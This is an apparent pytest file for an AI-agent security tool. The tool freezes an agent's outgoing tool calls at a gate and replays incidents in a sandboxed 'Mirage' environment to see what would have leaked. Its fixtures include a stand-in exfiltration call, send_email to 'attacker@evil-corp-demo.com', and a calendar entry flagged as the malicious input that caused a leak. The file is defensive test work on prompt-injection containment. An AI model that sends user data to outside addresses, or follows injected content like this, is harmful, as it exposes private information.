"""Service panels: prod outbox stays clean, Mirage outbox shows what would have left."""

import math
from datetime import UTC, datetime

import pytest
from fastapi.testclient import TestClient

from contracts.models import Event
from engine.api import server, services
from engine.api.replay import Replay

HUMAN = {"actor": "gabi", "reason": "test"}


@pytest.fixture
def api(monkeypatch):
    monkeypatch.setattr(server, "REPLAY", Replay(server.FIXTURES / "sample_demo.jsonl",
                                                 speed=math.inf))
    return TestClient(server.app)


def panel(api, service, env):
    return [(i["title"], i["flag"]) for i in api.get(f"/services/{service}?env={env}").json()["items"]]


def test_the_real_outbox_stays_clean_while_mirage_shows_the_leak(api):
    outbox = panel(api, "outbox", "prod")
    assert outbox.count(("Prep brief 2026-10-11", "normal")) == 2  # runs 1 and 3 did their job
    assert ("Q4 sync prep", "blocked") in outbox  # frozen by the gate: never sent
    assert panel(api, "outbox", "mirage") == []  # nothing detonated yet

    api.post("/incidents/inc_001/detonate")
    mirage = panel(api, "outbox", "mirage")
    assert mirage.count(("Q4 sync prep", "malicious")) == 3  # 3 replays, 3 leaks, all captured
    assert mirage.count(("Prep brief 2026-10-11", "normal")) == 3


def test_the_proven_cause_is_flagged_in_the_calendar(api):
    assert all(flag == "normal" for _, flag in panel(api, "calendar", "prod"))
    for path in ["/incidents/inc_001/detonate", "/runs/run_002/kill", "/incidents/inc_001/bisect"]:
        api.post(path, json=HUMAN)
    assert ("Partnership sync", "malicious") in panel(api, "calendar", "prod")
    assert [f for _, f in panel(api, "calendar", "mirage")].count("malicious") == 1
    assert panel(api, "crm", "prod")  # what the agents looked up


def test_bisection_and_fix_check_replays_are_not_in_the_mirage_outbox():
    def ev(seq, type, payload):
        return Event(seq=seq, ts=datetime.now(UTC), env="mirage", type=type, payload=payload)

    leak = {"to": "attacker@evil-corp-demo.com", "subject": "x"}
    log = [ev(1, "detonation.started", {"detonation_id": "d1", "purpose": "detonate"}),
           ev(2, "detonation.effect", {"detonation_id": "d1", "run_index": 1, "step": 1,
                                       "tool": "send_email", "args": leak, "violates": ["P1"]}),
           ev(3, "detonation.started", {"detonation_id": "d2", "removed_input_id": "in_01"}),
           ev(4, "detonation.effect", {"detonation_id": "d2", "run_index": 1, "step": 1,
                                       "tool": "send_email", "args": leak, "violates": ["P1"]}),
           ev(5, "detonation.started", {"detonation_id": "d3", "purpose": "verify"}),
           ev(6, "detonation.effect", {"detonation_id": "d3", "run_index": 1, "step": 1,
                                       "tool": "send_email", "args": leak, "violates": ["P1"]})]
    items = services.view(log, "outbox", "mirage").items
    assert [i.id for i in items] == ["d1:1:1"]


def test_unknown_panel_is_rejected(api):
    assert api.get("/services/gmail").status_code == 422
    assert api.get("/services/outbox?env=staging").status_code == 422


def test_a_released_email_shows_as_sent_and_the_incident_closes(monkeypatch):
    monkeypatch.setattr(server, "REPLAY", None)
    from engine.gateway import gate
    from tests.test_api import AGENT, ATTACKER, HUMAN, check, start
    gate.reset()
    api = TestClient(server.app)
    api.post("/agents", json=AGENT)
    run_id, auth = start(api)
    held = check(api, run_id, auth, "send_email", to=ATTACKER, subject="Partner list", body="x")
    assert panel(api, "outbox", "prod") == [("Partner list", "blocked")]

    api.post(f"/runs/{run_id}/unfreeze", json=HUMAN)  # a human: false positive
    api.post(f"/runs/{run_id}/tool-results", headers=auth,
             json={"call_id": held.json()["call_id"], "tool": "send_email", "result": "sent"})
    assert panel(api, "outbox", "prod") == [("Partner list", "normal")]  # it went out
    outbox = api.get("/services/outbox?env=prod").json()["items"]
    assert "sent after a human unfroze the run" in outbox[0]["subtitle"]
    incident = api.get("/incidents").json()[0]
    assert incident["status"] == "closed" and incident["next_action"] == "none"
